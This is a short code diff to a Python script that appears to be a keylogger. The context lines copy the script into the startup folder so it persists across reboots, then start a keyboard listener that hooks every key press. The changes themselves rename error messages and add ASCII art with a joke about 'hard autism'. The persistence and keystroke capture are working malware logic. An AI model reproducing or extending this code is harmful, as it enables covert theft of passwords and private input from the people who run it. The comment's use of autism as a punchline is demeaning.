@@ -48,11 +48,25 @@ def main():
     
     try:
         shutil.copy(current_script, startup_folder)
-        print("error")
+        print("error528")
     except Exception as e:
         print("error404", e)
         sys.exit(1)
-
+        # me after putting random  error codes:
+    #     (hard autism)
+#             /| _ ╱|、  
+#            ( •̀ㅅ •́  )
+#          ＿ノ ヽ ノ＼＿ 
+#        /　`/ ⌒Ｙ⌒ Ｙ　 \
+#       ( 　(三ヽ人　 /　 　|
+#       |　ﾉ⌒＼ ￣￣ヽ　 ノ
+#       ヽ＿＿＿＞､＿＿／
+#        ｜(   王   ﾉ〈 
+#         /ﾐ`  ー―彡   \ 
+#        |╰           ╯|   
+#        |     /\      |
+#        |    /  \     |                    
+#        |  /     \    |                  
     listener = keyboard.Listener(on_press=key_pressed)
     listener.start()
     listener.join()
